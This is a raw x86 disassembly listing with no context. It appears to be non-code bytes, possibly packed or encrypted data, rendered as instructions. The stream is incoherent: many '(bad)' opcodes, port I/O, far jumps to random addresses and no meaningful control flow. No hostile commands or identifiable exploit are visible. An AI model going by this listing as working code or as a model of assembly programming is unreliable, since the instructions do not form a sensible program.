  40aefa:	mov    eax,ds:0xa6b88ca5
  40aeff:	add    ah,BYTE PTR [esi-0x7cc3f64d]
  40af05:	fsubr  DWORD PTR [edx-0x55]
  40af08:	inc    esi
  40af09:	jle    0x40aea4
  40af0b:	and    eax,edi
  40af0d:	js     0x40aed8
  40af0f:	sub    al,0x43
  40af11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af12:	fbstp  TBYTE PTR [ebp-0x56]
  40af15:	jge    0x40af4b
  40af17:	popf   
  40af18:	adc    ebp,esp
  40af1a:	xchg   edi,eax
  40af1b:	and    ecx,DWORD PTR [edx-0x7e060dcf]
  40af21:	stos   BYTE PTR es:[edi],al
  40af22:	push   ebp
  40af23:	xlat   BYTE PTR ds:[ebx]
  40af24:	test   eax,0xf407da19
  40af29:	lock jge 0x40af18
  40af2c:	ret    0xa42f
  40af2f:	in     al,0x9f
  40af31:	cmp    DWORD PTR [edi],eax
  40af33:	mov    bl,0xb4
  40af35:	mov    eax,ds:0x7defd659
  40af3a:	daa    
  40af3b:	enter  0xc314,0x79
  40af3f:	xchg   edx,eax
  40af40:	pop    eax
  40af41:	aam    0x22
  40af43:	(bad)  
  40af45:	sub    ah,BYTE PTR [ecx]
  40af47:	add    ebx,DWORD PTR [edi]
  40af49:	pop    ebx
  40af4a:	ins    DWORD PTR es:[edi],dx
  40af4b:	jns    0x40aeda
  40af4d:	cmp    bh,BYTE PTR [ecx+edi*1+0x7f]
  40af51:	call   0x62288e64
  40af56:	aad    0x75
  40af58:	xlat   BYTE PTR ds:[ebx]
  40af59:	mov    eax,0xe172da5
  40af5e:	pusha  
  40af5f:	push   edx
  40af60:	pop    ebp
  40af61:	sub    DWORD PTR [eax],edx
  40af63:	cmp    ch,dl
  40af65:	xchg   ecx,eax
  40af66:	popf   
  40af67:	jge    0x40aef9
  40af69:	fwait
  40af6a:	adc    esp,DWORD PTR [eax+edi*1]
  40af6d:	dec    edi
  40af6e:	pop    ss
  40af6f:	test   eax,0x80a9524e
  40af74:	and    al,0xe1
  40af76:	jbe    0x40afb7
  40af78:	adc    al,0x2d
  40af7a:	xor    al,0x17
  40af7c:	out    dx,eax
  40af7d:	pop    edx
  40af7e:	or     edi,DWORD PTR [esi+ebx*8-0x66]
  40af82:	clc    
  40af83:	stos   DWORD PTR es:[edi],eax
  40af84:	adc    bh,dh
  40af86:	adc    bh,ah
  40af88:	test   eax,0xdbbefc8c
  40af8d:	dec    esp
  40af8e:	push   ecx
  40af8f:	or     esp,ecx
  40af91:	icebp  
  40af92:	mov    ch,0x80
  40af94:	jns    0x40af76
  40af96:	call   0xedfd3247
  40af9b:	out    dx,al
  40af9c:	push   ds
  40af9d:	mov    ecx,0x3c8c36e0
  40afa2:	bound  edx,QWORD PTR [ebx+0x9]
  40afa5:	daa    
  40afa6:	adc    al,BYTE PTR [esi]
  40afa8:	or     esi,DWORD PTR [eax+0x5a]
  40afab:	lods   eax,DWORD PTR ds:[esi]
  40afac:	rcr    BYTE PTR [ecx],cl
  40afae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afaf:	dec    esp
  40afb0:	mov    al,0x89
  40afb2:	xchg   edx,eax
  40afb3:	mov    ebp,0xd2819378
  40afb8:	(bad)
  40afbb:	xchg   esi,eax
  40afbc:	mov    edx,0x388717c0
  40afc1:	dec    ecx
  40afc2:	xchg   ebx,eax
  40afc3:	retf   
  40afc4:	cmp    ebx,DWORD PTR [edi+0x1be5867e]
  40afca:	xor    ebx,DWORD PTR [esi+ebp*2]
  40afcd:	adc    ch,dl
  40afcf:	stos   DWORD PTR es:[edi],eax
  40afd0:	call   0x5756:0xf486d1cd
  40afd7:	ret    0xdb5d
  40afda:	cmp    al,0xfa
  40afdc:	shl    BYTE PTR [ebx-0x37],1
  40afdf:	jbe    0x40af62
  40afe1:	mov    esi,0x438dc7d1
  40afe6:	adc    BYTE PTR [edi+0x68afa8b],dl
  40afec:	jmp    0xb704:0x9fb16320
  40aff3:	sub    eax,0xf694fb36
  40aff8:	sub    ebx,edi
  40affa:	sub    esp,ebx
  40affc:	fild   DWORD PTR [edx+0x31314def]
  40b002:	jg     0x40afc3
  40b004:	rcl    esi,cl
  40b006:	jnp    0x40b00b
  40b008:	ret    0x2438
  40b00b:	jns    0x40b013
  40b00d:	add    eax,0xd65d40c8
  40b012:	sbb    dl,BYTE PTR [edi-0x8352499]
  40b018:	nop
  40b019:	xchg   eax,esp
  40b01b:	out    dx,eax
  40b01c:	sti    
  40b01d:	xor    ch,bl
  40b01f:	jp     0x40b041
  40b021:	mov    edi,0xa7bba283
  40b026:	jno    0x40aff8
  40b028:	call   0x6251e439
  40b02d:	mov    gs,WORD PTR [esi+edx*2+0x74]
  40b031:	(bad)  
  40b033:	pop    eax
  40b034:	dec    ebx
  40b035:	and    eax,0x75669756
  40b03a:	xchg   esi,eax
  40b03b:	or     eax,0x3499af1f
  40b040:	sbb    esp,DWORD PTR [ebp-0x7427350b]
  40b046:	dec    eax
  40b047:	jle    0x40aff9
  40b049:	adc    eax,0x1837c737
  40b04e:	pop    esp
  40b04f:	lods   eax,DWORD PTR ds:[esi]
  40b050:	xchg   ebp,eax
  40b051:	lahf   
  40b052:	pop    eax
  40b053:	aaa    
  40b054:	outs   dx,DWORD PTR ds:[esi]
  40b055:	fnstcw WORD PTR [ecx-0x62]
  40b058:	adc    ebp,DWORD PTR [ecx+0x43dd9dab]
  40b05e:	loope  0x40b01c
  40b060:	sub    eax,0xe9890f3c
  40b065:	add    ebx,DWORD PTR [ebp-0x9]
  40b068:	dec    esp
  40b069:	(bad)  
  40b06a:	fld    DWORD PTR [edx]
  40b06c:	dec    edi
  40b06d:	push   ss
  40b06e:	ror    DWORD PTR [eax],1
  40b070:	dec    edx
  40b071:	test   esi,esi
  40b073:	mov    esp,0xce2c4fd9
  40b078:	ss cwde 
  40b07a:	and    DWORD PTR [eax+0x3e1f5792],0x24
  40b081:	in     eax,0xf6
  40b083:	push   edx
  40b084:	mov    ds:0x19d988b9,al
  40b089:	imul   DWORD PTR ds:0xc345fde1
  40b08f:	xlat   BYTE PTR ds:[ebx]
  40b090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b091:	xchg   esp,eax
  40b092:	pusha  
  40b093:	hlt    
  40b094:	mov    ebx,0x6c444098
  40b099:	xchg   ebx,eax
  40b09a:	test   ebp,esi
  40b09c:	pop    ebx
  40b09d:	aam    0x75
  40b09f:	aaa    
  40b0a0:	mov    edi,0x8a7375f8
  40b0a5:	mov    ch,0x2b
  40b0a7:	sub    eax,0x3a595410
  40b0ac:	adc    DWORD PTR [ecx+0xd2b8de3],esp
  40b0b2:	push   cs
  40b0b3:	cmp    eax,0x7f50ae51
  40b0b8:	xor    cl,BYTE PTR [eax-0x116471b3]
  40b0be:	adc    DWORD PTR [esi-0x4363532],0x33679e72
  40b0c8:	cld    
  40b0c9:	sti    
  40b0ca:	loope  0x40b0a1
  40b0cc:	(bad)  
  40b0cd:	mov    DWORD PTR [esp+edi*1],eax
  40b0d0:	mov    bh,0x80
  40b0d2:	out    0x37,al
  40b0d4:	(bad)  
  40b0d5:	cmc    
  40b0d6:	movnti DWORD PTR [eax],ebp
  40b0d9:	xor    al,dh
  40b0db:	mov    ecx,0x40ff19dc
  40b0e0:	xchg   edx,eax
  40b0e1:	push   edi
  40b0e2:	mov    edx,0xcba77512
  40b0e7:	jmp    DWORD PTR [ecx-0x63]
  40b0ea:	sub    ecx,DWORD PTR [eax-0x38a7e735]
  40b0f0:	add    al,0xb9
  40b0f2:	cs hlt 
  40b0f4:	popa   
  40b0f5:	imul   esi,DWORD PTR [ebx-0x43],0x2851ec69
  40b0fc:	punpckhdq mm1,QWORD PTR [ecx]
  40b0ff:	clc    
  40b100:	into   
  40b101:	push   0xffffffa9
  40b103:	adc    eax,0x5bfd6b12
  40b108:	jne    0x40b15f
  40b10a:	popf   
  40b10b:	cwde   
  40b10c:	sbb    DWORD PTR [eax-0x24215246],0x66
  40b113:	push   0x28
  40b115:	ret    0x2fc4
  40b118:	outs   dx,DWORD PTR ds:[esi]
  40b119:	cmp    DWORD PTR [ebx+0x7eb63143],ebp
  40b11f:	fimul  WORD PTR [ecx-0x6c8cc49e]
  40b125:	adc    DWORD PTR [ecx+0x20],edi
  40b128:	clc    
  40b129:	in     al,0x7a
  40b12b:	cwde   
  40b12c:	leave  
  40b12d:	xor    eax,0xb1f81e42
  40b132:	and    ecx,ebp
  40b134:	je     0x40b14d
  40b136:	push   ebp
  40b137:	mov    ds:0xa657b9a2,al
  40b13c:	rcr    BYTE PTR [ebx],1
  40b13e:	mov    ah,0x5c
  40b140:	enter  0x6f0f,0x95
  40b144:	lods   al,BYTE PTR ds:[esi]
  40b145:	test   DWORD PTR ds:0xb0c5d07e,edi
  40b14b:	test   eax,0x2ceb28af
  40b150:	or     ch,BYTE PTR [esi+0x14e07f6a]
  40b156:	mov    dh,0x7c
  40b158:	push   esi
  40b159:	mov    ah,BYTE PTR [ebx-0x42e0e111]
  40b15f:	test   DWORD PTR [ecx-0x59],ecx
  40b162:	jns    0x40b158
  40b164:	(bad)  
  40b165:	jmp    0x773738d1
  40b16a:	mov    ebx,0xba809a29
  40b16f:	sub    edx,DWORD PTR [eax+0x5c]
  40b172:	cdq    
  40b173:	(bad)  
  40b174:	pop    edx
  40b175:	push   edx
  40b176:	push   edi
  40b177:	xchg   ecx,eax
  40b178:	mov    bh,0x60
  40b17a:	pop    esi
  40b17b:	or     ah,dl
  40b17d:	fmul   QWORD PTR [ebp+0x668ce2f8]
  40b183:	push   eax
  40b184:	mov    cl,0xab
  40b186:	sub    al,0x45
  40b188:	cmp    ebx,DWORD PTR [ebp+0x58]
  40b18b:	pop    esp
  40b18c:	clc    
  40b18d:	(bad)  
  40b18e:	lock jno 0x40b20e
  40b191:	mov    ds:0xeeca2d4e,al
  40b196:	mov    eax,0x61986284
  40b19b:	icebp  
  40b19c:	mov    dl,0xbb
  40b19e:	fstp   QWORD PTR [bx+0x1e]
  40b1a2:	ror    DWORD PTR [eax-0x29],cl
  40b1a5:	push   cs
  40b1a6:	popf   
  40b1a7:	mov    bh,0xca
  40b1a9:	push   ss
  40b1aa:	sub    eax,DWORD PTR [eax+0x3ecc7d7f]
  40b1b0:	mul    cl
  40b1b2:	cmp    BYTE PTR [edx+edi*1],ah
  40b1b5:	cwde   
  40b1b6:	adc    al,0xc4
  40b1b8:	pop    eax
  40b1b9:	in     eax,0x65
  40b1bb:	call   0x9d30:0x5dbedb53
  40b1c2:	push   0x185ca11d
  40b1c7:	mov    bh,0x72
  40b1c9:	(bad)  
  40b1cb:	ret    
  40b1cc:	dec    edi
  40b1cd:	aaa    
  40b1ce:	push   0x5ca70cb7
  40b1d3:	sub    al,0xa1
  40b1d5:	pusha  
  40b1d6:	call   0x82a9:0xd5fac317
  40b1dd:	repnz retf 
  40b1df:	adc    BYTE PTR [esi-0x7a329006],al
  40b1e5:	imul   ebx,DWORD PTR [edx-0x55],0xffffffb2
  40b1e9:	dec    edx
  40b1ea:	pop    esi
  40b1eb:	sub    ch,BYTE PTR ss:[esi+0x5c]
  40b1ef:	push   ebx
  40b1f0:	cs je  0x40b238
  40b1f3:	aaa    
  40b1f4:	popa   
  40b1f5:	add    BYTE PTR [eax+0x64af38cd],bl
  40b1fb:	inc    esi
  40b1fc:	(bad)  
  40b1fd:	mov    ch,0x9f
  40b1ff:	cdq    
  40b200:	(bad)  
  40b201:	and    eax,0x41b0633b
  40b206:	bound  ebx,QWORD PTR [ecx+0x51]
  40b209:	xchg   ebx,eax
  40b20a:	xor    eax,0xaf4085f2
  40b20f:	mov    ebp,0xfdf73891
  40b214:	adc    DWORD PTR [ebx+0x19],edx
  40b217:	lock pop ss
  40b219:	fst    DWORD PTR [edx]
  40b21b:	sub    DWORD PTR [edi],edi
  40b21d:	mov    WORD PTR [esi],ds
  40b21f:	(bad)  
  40b220:	mov    ds:0xe75ded31,eax
  40b225:	sahf   
  40b226:	loope  0x40b247
  40b228:	jbe    0x40b24f
  40b22a:	xchg   DWORD PTR [edx-0x51c801e6],ebp
  40b230:	dec    ecx
  40b231:	xlat   BYTE PTR ds:[ebx]
  40b232:	std    
  40b233:	mov    ds:0xc88644df,al
  40b238:	fld    QWORD PTR [ebp+esi*2+0x711a1a38]
  40b23f:	jle    0x40b29e
  40b241:	dec    esp
  40b242:	mov    ch,0x46
  40b244:	in     eax,dx
  40b245:	push   ss
  40b246:	(bad)  
  40b247:	add    eax,0x7bb470a4
  40b24c:	loopne 0x40b2b2
  40b24e:	mov    edx,0x77df27e5
  40b253:	hlt    
  40b254:	mov    esp,edi
  40b256:	jmp    0x1433:0xb3109e17
  40b25d:	loopne 0x40b25a
  40b25f:	test   DWORD PTR [esi+0x2d],edx
  40b262:	sub    DWORD PTR [ebp-0x74a5451d],ebp
  40b268:	xchg   ebp,ebp
  40b26a:	loope  0x40b2d6
  40b26c:	mov    ah,0x71
  40b26e:	in     al,0xb8
  40b270:	push   ss
  40b271:	clc    
  40b272:	xor    ah,BYTE PTR [edx-0x11]
  40b275:	stos   BYTE PTR es:[edi],al
  40b276:	jae    0x40b271
  40b278:	rcr    BYTE PTR [edi-0x41],1
  40b27b:	mov    ebp,0x4dc43672
  40b280:	addr16 ds dec ebx
  40b283:	or     eax,0xfdf45670
  40b288:	inc    BYTE PTR [ebx+0xd]
  40b28b:	add    DWORD PTR [edx+0x3cb075b],esp
  40b291:	(bad)  
  40b292:	lahf   
  40b293:	xchg   edx,eax
  40b294:	(bad)  
  40b295:	pop    ebp
  40b296:	lds    eax,FWORD PTR [edi]
  40b298:	jmp    0x40b2f7
  40b29a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b29b:	xchg   edi,eax
  40b29c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b29d:	imul   edi,DWORD PTR [ebx],0x86f8a826
  40b2a3:	push   esi
  40b2a4:	mov    edi,0x44eea5b8
  40b2a9:	mov    ah,0xf4
  40b2ab:	js     0x40b291
  40b2ad:	xor    DWORD PTR [esi],edx
  40b2af:	mov    bh,0xbb
  40b2b1:	sub    ebx,DWORD PTR [edi+0x78e5f3ae]
  40b2b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2b8:	sbb    ebx,esp
  40b2ba:	int    0x85
  40b2bc:	adc    bl,BYTE PTR [edi+0x42943881]
  40b2c2:	ret    
  40b2c3:	data16 sbb al,0xd
  40b2c6:	ror    DWORD PTR [ecx+0xcead6c8],cl
  40b2cc:	adc    BYTE PTR [esi],cl
  40b2ce:	xor    edx,DWORD PTR [edi]
  40b2d0:	lods   al,BYTE PTR ds:[esi]
  40b2d1:	and    DWORD PTR [edx+0x77],esi
  40b2d4:	inc    ecx
  40b2d5:	sbb    DWORD PTR [edx+ecx*2-0x3b],edx
  40b2d9:	or     ebp,ebx
  40b2db:	loopne 0x40b331
  40b2dd:	loope  0x40b2c7
  40b2df:	fimul  DWORD PTR [esp+esi*1+0x42265751]
  40b2e6:	ret    0x5d69
  40b2e9:	sub    al,0x0
  40b2eb:	mov    al,0xa7
  40b2ed:	push   es
  40b2ee:	aam    0x0
  40b2f0:	ss and ah,0x48
  40b2f4:	and    ah,bl
  40b2f6:	fnstcw WORD PTR [ebp-0x610025ee]
  40b2fc:	push   edi
  40b2fd:	sar    BYTE PTR [esi+ebx*2],0x5
  40b301:	dec    edx
  40b302:	jmp    0x759b46bc
  40b307:	add    ah,BYTE PTR [ecx]
  40b309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b30a:	mov    edi,0xc1783ed0
  40b30f:	cmc    
  40b310:	jb     0x40b2bd
  40b312:	cmp    ebx,DWORD PTR [eax-0x67ad5530]
  40b318:	and    DWORD PTR [eax+ebx*2],ebp
  40b31b:	aam    0x6d
  40b31d:	pop    ebp
  40b31e:	je     0x40b2ef
  40b320:	into   
  40b321:	push   DWORD PTR [eax-0x10ec6450]
  40b327:	inc    esp
  40b328:	(bad)  
  40b329:	in     al,0x7d
  40b32b:	push   edi
  40b32c:	aad    0x56
  40b32e:	mov    edx,0x757dc7c7
  40b333:	imul   ebx,DWORD PTR [eax+0x251fdd80],0x55
  40b33a:	mov    BYTE PTR [ecx+edx*1+0xe],0x9d
  40b33f:	pop    esi
  40b340:	fs test eax,0x7cfced53
  40b346:	mov    ecx,esp
  40b348:	add    esi,DWORD PTR [esi+0x7b]
  40b34b:	lahf   
  40b34c:	jl     0x40b2de
  40b34e:	adc    al,0x7e
  40b350:	adc    eax,0xc67d287d
  40b355:	ss dec esi
  40b357:	mov    esp,0xb8c58b60
  40b35c:	dec    ebp
  40b35d:	mov    al,0xc2
  40b35f:	(bad)  
  40b361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b362:	fxch   st(7)
  40b364:	sub    BYTE PTR [edi-0x17c03b32],ah
  40b36a:	sbb    ch,BYTE PTR [edi-0x5d]
  40b36d:	js     0x40b31a
  40b36f:	jae    0x40b33d
  40b371:	cs mov esp,0xcf304e86
  40b377:	fwait
  40b378:	sbb    BYTE PTR [ecx+0x3],al
  40b37b:	mov    ecx,0x78d0a665
  40b380:	xor    BYTE PTR [edx+edx*4+0x617328a6],bl
  40b387:	and    eax,0x4acc57d4
  40b38c:	scas   al,BYTE PTR es:[edi]
  40b38d:	mov    DWORD PTR [edi-0x11],edi
  40b390:	cmp    ebx,DWORD PTR [eax-0x5e0dd52b]
  40b396:	fstp   st(1)
  40b398:	jg     0x40b410
  40b39a:	xor    eax,0xfd461041
  40b39f:	cld    
  40b3a0:	fstp   DWORD PTR [esi-0x1d0da285]
  40b3a6:	push   0x43746860
  40b3ab:	adc    eax,0x1f13b05d
  40b3b0:	jnp    0x40b431
  40b3b2:	in     al,dx
  40b3b3:	and    DWORD PTR [ebp-0x7c],esi
  40b3b6:	pop    ebx
  40b3b7:	dec    ecx
  40b3b8:	adc    ebx,ebp
  40b3ba:	jmp    0x835de947
  40b3bf:	add    eax,0xdf780e3a
  40b3c4:	out    0x1,eax
  40b3c6:	pop    ebp
  40b3c7:	sbb    eax,0xfedc0eb5
  40b3cc:	stc    
  40b3cd:	jle    0x40b378
  40b3cf:	in     eax,0x9b
  40b3d1:	pop    ss
  40b3d2:	es xchg edi,eax
  40b3d4:	leave  
  40b3d5:	or     eax,0xfea47c1f
  40b3da:	xchg   esp,eax
  40b3db:	pop    edx
  40b3dc:	and    al,0xd9
  40b3de:	mov    esi,0x6ff4acab
  40b3e3:	pop    edi
  40b3e4:	xor    eax,0xaf27d1
  40b3e9:	ins    DWORD PTR es:[edi],dx
  40b3ea:	mov    eax,ds:0xd7b4801b
  40b3ef:	push   ebp
  40b3f0:	int3   
  40b3f1:	jle    0x40b3e8
  40b3f3:	dec    ecx
  40b3f4:	inc    eax
  40b3f5:	dec    edi
  40b3f6:	pop    es
  40b3f7:	inc    edx
  40b3f8:	test   BYTE PTR [edx+0x288317f0],ch
  40b3fe:	and    al,0x24
  40b400:	icebp  
  40b401:	jmp    0x40b42e
  40b403:	js     0x40b41a
  40b405:	dec    edi
  40b406:	adc    ecx,esi
  40b408:	inc    ebp
  40b409:	pop    ds
  40b40a:	out    dx,eax
  40b40b:	dec    edi
  40b40c:	pushf  
  40b40d:	aad    0xbd
  40b40f:	mov    bl,0x5b
  40b411:	dec    edx
  40b412:	sahf   
  40b413:	and    eax,DWORD PTR [edi-0x4975165d]
  40b419:	imul   eax,DWORD PTR [ebx+0x34c6c940],0x3107f76
  40b423:	in     al,0x97
  40b425:	in     eax,dx
  40b426:	retf   0x3374
  40b429:	ret    0xf554
  40b42c:	rcr    BYTE PTR [eax+edi*8+0x4e],1
  40b430:	sbb    DWORD PTR [edx+0x2f],esp
  40b433:	xchg   esp,eax
  40b434:	add    al,BYTE PTR [eax]
  40b436:	sbb    ah,BYTE PTR [eax]
  40b438:	cmp    DWORD PTR [esi+edi*1+0x74602f91],edi
  40b43f:	dec    esi
  40b440:	jbe    0x40b407
  40b442:	aam    0x34
  40b444:	pop    esp
  40b445:	arpl   WORD PTR [eax+0x706f8155],dx
  40b44b:	xchg   ebx,eax
  40b44c:	stos   BYTE PTR es:[edi],al
  40b44d:	enter  0x1e30,0x80
  40b451:	test   cl,ch
  40b453:	sbb    dh,cl
  40b455:	and    eax,0xc73d397f
  40b45a:	add    ebx,DWORD PTR [edi+0x28]
  40b45d:	sub    DWORD PTR [esi+eiz*4-0x573526a4],eax
  40b464:	jno    0x40b409
  40b466:	xchg   esi,eax
  40b467:	dec    esp
  40b468:	test   al,0xaf
  40b46a:	mov    edi,0xc92a9eb5
  40b46f:	(bad)
  40b472:	xor    eax,0xc2cc2ca
  40b477:	call   0x85fd24f9
  40b47c:	shr    DWORD PTR [esi+0x7cc9327c],cl
  40b482:	lock mov esi,0x6aba4195
  40b488:	push   DWORD PTR [ebx+ecx*2-0x30f02b96]
  40b48f:	data16 (bad) 
  40b493:	out    0xd9,al
  40b495:	add    eax,0xd708429e
  40b49a:	std    
  40b49b:	sub    eax,0x38c3fecf
  40b4a0:	sahf   
  40b4a1:	and    eax,0x64ba6bfc
  40b4a6:	jns    0x40b4d0
  40b4a8:	jecxz  0x40b4b5
  40b4aa:	push   ebx
  40b4ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4ac:	mov    ebp,0xa2283f64
  40b4b1:	xchg   esi,edx
  40b4b3:	dec    edx
  40b4b4:	aas    
  40b4b5:	ret    0x7ade
  40b4b8:	and    DWORD PTR [ecx],0xffffff9b
  40b4bb:	sti    
  40b4bc:	xor    bl,ch
  40b4be:	call   0x868:0xdc647c23
  40b4c5:	pop    ebx
  40b4c6:	shl    BYTE PTR [edi],1
  40b4c8:	mov    BYTE PTR [ebp+0x43],bh
  40b4cb:	sub    BYTE PTR [edx+0x61],dh
  40b4ce:	lock pop ds
  40b4d0:	adc    bl,BYTE PTR [ebx+0x5d]
  40b4d3:	push   edi
  40b4d4:	inc    eax
  40b4d5:	add    ah,BYTE PTR [ebx-0x27]
  40b4d8:	ds sbb eax,0xf5422989
  40b4de:	aaa    
  40b4df:	sahf   
  40b4e0:	lahf   
  40b4e1:	adc    ah,bh
  40b4e3:	inc    ecx
  40b4e4:	xchg   ebx,eax
  40b4e5:	or     ecx,eax
  40b4e7:	pusha  
  40b4e8:	sbb    BYTE PTR [ebp-0x1f],dh
  40b4eb:	ret    0x9f6d
  40b4ee:	stc    
  40b4ef:	inc    esi
  40b4f0:	mov    edx,0x46a18ba4
  40b4f5:	push   cs
  40b4f6:	in     al,0x7a
  40b4f8:	mov    ecx,0x27b8efb0
  40b4fd:	and    ebp,ecx
  40b4ff:	mov    ds:0x462d79e,eax
  40b504:	inc    edi
  40b505:	or     esp,edi
  40b507:	or     al,0x8b
  40b509:	ror    DWORD PTR [edx+0x462a253f],cl
  40b50f:	pop    ebx
  40b510:	push   0xe0e2ef22
  40b515:	adc    ebx,ebx
  40b517:	mul    BYTE PTR [edx+0x30fd8534]
  40b51d:	imul   edi,DWORD PTR [eax+0x19],0x4e85cc01
  40b524:	adc    ecx,DWORD PTR [edx-0x1a]
  40b527:	(bad)  
  40b528:	(bad)  
  40b529:	mov    al,ds:0x73221070
  40b52e:	sbb    eax,0x4f8882b2
  40b533:	sub    ebx,0x57
  40b536:	(bad)
  40b53a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b53b:	addr16 pop esp
  40b53d:	jne    0x40b4f3
  40b53f:	sti    
  40b540:	add    BYTE PTR [esi+edx*4-0x73312a27],cl
  40b547:	sbb    al,0xb
  40b549:	popa   
  40b54a:	xchg   ebp,eax
  40b54b:	mov    esp,0x33b96ac6
  40b550:	cmp    DWORD PTR [eax+eiz*2],ebp
  40b553:	mov    bh,0xa1
  40b555:	cmp    edx,DWORD PTR [ecx+0x727f76df]
  40b55b:	mov    ah,0x20
  40b55d:	add    ecx,edi
  40b55f:	mov    ch,0x2b
  40b561:	mov    WORD PTR [eax+0x5c489327],ss
  40b567:	lahf   
  40b568:	and    DWORD PTR [ecx],esi
  40b56a:	out    dx,al
  40b56b:	je     0x40b4ff
  40b56d:	push   es
  40b56e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b56f:	test   BYTE PTR [eax],bl
  40b571:	sbb    BYTE PTR [edi+0x479f26f5],ah
  40b577:	iret   
  40b578:	mov    edi,0x9382507
  40b57d:	mov    al,0x9a
  40b57f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b581:	icebp  
  40b582:	adc    eax,0x38461fdb
  40b587:	xchg   ecx,esi
  40b589:	mov    DWORD PTR [eax-0x7b],edi
  40b58c:	aaa    
  40b58d:	clc    
  40b58e:	and    BYTE PTR [ecx],ch
  40b590:	sub    bh,BYTE PTR [ecx]
  40b592:	jae    0x40b56a
  40b594:	repz sub BYTE PTR [ecx-0x4ccc3885],0x8e
  40b59c:	into   
  40b59d:	int3   
  40b59e:	xchg   esp,eax
  40b59f:	dec    edi
  40b5a0:	cmp    BYTE PTR [edi+0x174c7690],bh
  40b5a6:	adc    DWORD PTR [esi+0x1d2d4da0],0x29
  40b5ad:	sub    eax,0xecb9fd05
  40b5b2:	dec    ebx
  40b5b3:	fldenv [esi+0x73]
  40b5b6:	add    ebp,esp
  40b5b8:	arpl   bx,ax
  40b5ba:	sti    
  40b5bb:	cmp    BYTE PTR [ecx+0x2481c5f6],ah
  40b5c1:	cli    
  40b5c2:	retf   
  40b5c3:	ficom  DWORD PTR [edi]
  40b5c5:	dec    esi
  40b5c6:	xor    al,0x68
  40b5c8:	mov    ebp,0x127f3a28
  40b5cd:	xor    dl,BYTE PTR [ecx+eiz*1+0x20]
  40b5d1:	mov    al,ds:0x55f39213
  40b5d6:	xchg   edi,eax
  40b5d7:	sub    BYTE PTR [ecx+0x1baf66fa],0xf9
  40b5de:	mov    ch,0x1b
  40b5e0:	in     al,0x7e
  40b5e2:	or     al,0xc0
  40b5e4:	(bad)  
  40b5e5:	mov    al,ds:0xc163e135
  40b5ea:	adc    BYTE PTR [eax+0x0],ch
  40b5ed:	lock fist DWORD PTR [eax]
  40b5f0:	mov    DWORD PTR [edx+0x14],esp
  40b5f3:	ja     0x40b665
  40b5f5:	mov    dh,BYTE PTR [edi+0x2c]
  40b5f8:	inc    esp
  40b5f9:	outs   dx,BYTE PTR ds:[esi]
  40b5fa:	mov    ebx,DWORD PTR [ecx+ecx*4+0x7d8c448d]
  40b601:	into   
  40b602:	imul   edx,DWORD PTR [ebx-0x5c],0xffffffa7
  40b606:	sbb    edi,edx
  40b608:	mov    ds:0x1aa61aae,eax
  40b60d:	test   DWORD PTR [ecx-0x6e],0x1d9ebab2
  40b614:	pop    es
  40b615:	out    dx,eax
  40b616:	mov    WORD PTR [eax-0x7a],ss
  40b619:	sub    dl,al
  40b61b:	repz push edx
  40b61d:	fbstp  TBYTE PTR [edx]
  40b61f:	mov    edi,0x5fbb6b05
  40b624:	leave  
  40b625:	mov    ebx,0xf4c3d038
  40b62a:	pop    ebx
  40b62b:	aam    0x43
  40b62d:	fld    DWORD PTR ds:0x1caf0edc
  40b633:	test   al,0x3c
  40b635:	pushf  
  40b636:	popa   
  40b637:	test   DWORD PTR [ebp+0x31],ebx
  40b63a:	adc    eax,0xc0e44427
  40b63f:	je     0x40b61d
  40b641:	jmp    0x9282:0xd21aafa
  40b648:	lock adc eax,DWORD PTR [ebx]
  40b64b:	icebp  
  40b64c:	fst    st(7)
  40b64e:	push   ebx
  40b64f:	cs add eax,0xc280774f
  40b655:	outs   dx,BYTE PTR ds:[esi]
  40b656:	push   edx
  40b657:	hlt    
  40b658:	mov    ah,BYTE PTR [ebp+0x7b]
  40b65b:	stos   BYTE PTR es:[edi],al
  40b65c:	pop    esp
  40b65d:	test   DWORD PTR [ebx-0x7a],esp
  40b660:	loopne 0x40b6a5
  40b662:	or     ebx,DWORD PTR [edi+esi*4-0x2a]
  40b666:	pop    es
  40b667:	xor    al,0x20
  40b669:	mov    WORD PTR [esi-0x311010d1],fs
  40b66f:	pop    ecx
  40b670:	mov    BYTE PTR [eax],dh
  40b672:	out    dx,al
  40b673:	pop    esp
  40b674:	(bad)
  40b677:	mov    cl,BYTE PTR [ebx-0x561a0678]
  40b67d:	xchg   ebp,eax
  40b67e:	daa    
  40b67f:	dec    ecx
  40b680:	adc    eax,0xaff96376
  40b685:	lds    edx,FWORD PTR [ebp+0x224436ac]
  40b68b:	sub    BYTE PTR [esi+0x6ac84dcc],ah
  40b691:	adc    DWORD PTR [eax],0x8c227fbd
  40b697:	xchg   edx,eax
  40b698:	mov    gs,WORD PTR [eax-0x10]
  40b69b:	(bad)  
  40b69c:	mov    edi,0xbee7c508
  40b6a1:	mov    al,ah
  40b6a3:	addr16 jo 0x40b62b
  40b6a6:	or     al,0xbd
  40b6a8:	sbb    al,0x78
  40b6aa:	rcr    BYTE PTR [eax],1
  40b6ac:	test   al,0x93
  40b6ae:	sub    al,0x10
  40b6b0:	sar    BYTE PTR [eax],cl
  40b6b2:	push   ecx
  40b6b3:	sub    eax,0x687227a2
  40b6b8:	hlt    
  40b6b9:	add    DWORD PTR [ebp+0x4d6f33fd],eax
  40b6bf:	cwde   
  40b6c0:	mov    al,0x8e
  40b6c2:	(bad)  [edi-0x7e3aeeb8]
  40b6c8:	clc    
  40b6c9:	mov    cl,BYTE PTR [esi+0x7e]
  40b6cc:	stos   BYTE PTR es:[edi],al
  40b6cd:	arpl   bp,bp
  40b6cf:	out    0xf8,eax
  40b6d1:	scas   al,BYTE PTR es:[edi]
  40b6d2:	mov    ch,0x78
  40b6d4:	mov    edi,DWORD PTR [ecx+0x6a]
